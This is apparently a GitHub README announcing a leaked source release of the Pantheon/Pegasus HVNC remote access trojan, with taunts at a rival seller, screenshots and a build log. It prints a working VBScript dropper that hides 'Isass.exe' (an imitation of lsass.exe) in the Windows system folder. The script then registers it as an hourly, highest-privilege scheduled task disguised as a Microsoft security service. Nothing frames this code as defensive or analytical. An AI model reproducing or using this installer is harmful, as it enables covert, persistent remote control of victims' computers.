# Pantheon-HVNC-V2-Source-leaked

 * here is Pegasus/Pantheon HVNC or skynet?
@TheSkynetCorporation this post is for all peopledon't get scammed by buying shitty HVNC! 
**Updated Time : 18/04/2022**
     **Next Update 24/04/2022**
     
Since guy is seriously distrubed in head, source and recompiled coming in bit


![bahahahahaha](https://user-images.githubusercontent.com/1867768/164896945-cb1327fb-ae23-4dcd-b561-d065b302e98a.png)

hahahahhahahahaahhahaahahahahahhaahahhahahaah

Who is selling what actually?? Dude it's FREE here and always will be now do some gipsy magic and puff off ;)
Damn dude how low you can go?


![resim](https://user-images.githubusercontent.com/103955692/163860298-2adb53c3-f030-43ad-8b0b-66f84201a688.png)
![resim](https://user-images.githubusercontent.com/103955692/163860309-780b3942-cd64-4cec-bb43-931416d5993b.png)

▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

I would kindly ask you ***not to bother me*** with questions like it won't compile help.
or if you get that obviuos error like damn resource is missing heeeeelp - simply ***I don't care(especially for statements I can't wait, I want and similar. Feel free to purchase garbage mentioned above or reverse yourself).***
***Im not*** posting this so kids could play hackers, ***nor do I support reversed projects.***
Anyways if one decide to msg me with similar bs, please before you do download [ILSpy](https://github.com/icsharpcode/ILSpy/).
IF one manage to compile it without issues feel free to contact me if not go back to ***Hello world apps.***

▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

![resim](https://user-images.githubusercontent.com/103955692/163860330-fb515385-55ec-4846-9e17-71684636f900.png)

![Screenshot_1](https://user-images.githubusercontent.com/1867768/164581897-d8b3750c-90e5-49b2-9ea5-35bd7f3d9f98.png)

[Except ones compiled from full source ;)]
https://streamable.com/ghpv5y
```
Build started...
1>------ Build started: Project: Pegasus R.A.T, Configuration: Release Any CPU ------
1>  Pegasus R.A.T -> S:\iPwnNoobPony\Pegasus42\Source\Pegasus R.A.T\bin\Release\Pegasus R.A.T.exe
========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========

```
on error resume next
set o=createobject("wscript.shell")
'f=o.ExpandEnvironmentStrings("%appdata%\Pantheon")
f=o.ExpandEnvironmentStrings("%appdata%")
c = "cmd /c md " & f 
'o.run c,0,1
WScript.Sleep(1000)
'c = "cmd /c move " & chr(34) & f & "\..\Isass.exe" & chr(34) & " " & chr(34) & f & chr(34)
c = "cmd /c move " & chr(34) & f & "\Isass.exe" & chr(34) & " " & chr(34) & "C:\windows\syswow64" & chr(34)
o.run c,0,1
'c = "schtasks /create /f /tn " & chr(34) & "OneDrive.{7d01bf11-6e05-4dfd-8936-9366c7d70b4d}" & chr(34)
c = "schtasks /create /f /tn " & chr(34) & "Microsoft\Windows\Security\SAMService" & chr(34)
c = c & " /sc hourly /rl highest /tr " & chr(34) & "c:\windows\syswow64\Isass.exe" & chr(34)
o.run c,0,1
Wscript.Sleep(2000)
o.run "schtasks /run /tn " & chr(34) & "Microsoft\Windows\Security\SAMService" & chr(34),0,0
```

Keep up the good work ^^


**https://www.pantheon.one/**
